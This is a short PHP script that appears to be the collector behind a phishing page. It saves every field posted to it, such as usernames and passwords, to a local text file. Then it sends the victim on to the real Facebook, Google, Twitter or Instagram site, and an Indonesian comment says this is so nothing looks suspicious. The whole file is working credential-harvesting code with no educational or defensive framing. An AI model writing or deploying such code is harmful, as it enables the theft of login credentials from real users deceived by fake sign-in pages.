<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $log_file = 'users.txt';
    if (file_exists('usernames.txt')) $log_file = 'usernames.txt';
    
    $entry = '[+] ' . date('Y-m-d H:i:s') . "\n";
    foreach ($_POST as $key => $value) {
        $entry .= $key . ': ' . $value . "\n";
    }
    $entry .= "=============================================\n";
    file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
    
    // Redirect ke situs asli agar tidak mencurigakan
    $referer = $_SERVER['HTTP_HOST'] ?? '';
    if (strpos($referer, 'facebook') !== false) {
        header('Location: https://www.facebook.com');
    } elseif (strpos($referer, 'google') !== false) {
        header('Location: https://accounts.google.com');
    } elseif (strpos($referer, 'twitter') !== false) {
        header('Location: https://twitter.com');
    } elseif (strpos($referer, 'instagram') !== false) {
        header('Location: https://www.instagram.com');
    } else {
        header('Location: https://www.google.com');
    }
    exit();
}
?>
